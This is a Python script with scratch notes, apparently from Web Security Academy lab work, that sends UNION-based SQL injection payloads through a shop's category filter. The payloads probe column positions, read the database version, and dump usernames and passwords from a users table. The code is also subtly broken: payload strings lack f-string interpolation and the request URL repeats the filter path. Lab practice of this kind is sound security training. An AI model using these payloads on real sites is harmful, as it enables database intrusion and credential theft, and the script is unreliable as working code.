import requests
import sys
import re
from bs4 import BeautifulSoup


s = requests.Session()

site = 'https://ac7f1fd71ef64b42c037809d00f3001b.web-security-academy.net/filter?category='

resp = s.get(site)
soup = BeautifulSoup(resp.text,'html.parser')
hint_text = soup.find(id='hint').get_text().split("'")[1]
print(f"Database needs to retrieve the string {hint_text}")

def try_category(category_string):
    url = f'{site}/filter?category={category_string}'
    resp = s.get(url)
    print(resp.text)

s = requests.Session()

try_category("""Gifts' UNION SELECT {hint_text},null,null -- """)
print('2nd CATEGORY')
try_category("""Gifts' UNION SELECT null,{hint_text},null -- """)
print('3RD CATEGORY')
try_category("""Gifts' UNION SELECT null,null,{hint_text} -- """)


'0NWiTv'

https://ac7f1fd71ef64b42c037809d00f3001b.web-security-academy.net/filter?category=Gifts' UNION SELECT '0NWiTv',null,null --

https://ac7f1fd71ef64b42c037809d00f3001b.web-security-academy.net/filter?category=Gifts' UNION SELECT null,'0NWiTv',null --



https://ac971f101f6b8afac01c45fc00c10090.web-security-academy.net/filter?category=Gifts' UNION SELECT username, password FROM users--

#step10 url
https://ac911f231ef74013c0d45cba00870007.web-security-academy.net/filter?category=Accessories' UNION SELECT @@version, null--


https://ac911f231ef74013c0d45cba00870007.web-security-academy.net/filter?category=Gifts' UNION SELECT @@version, null, null --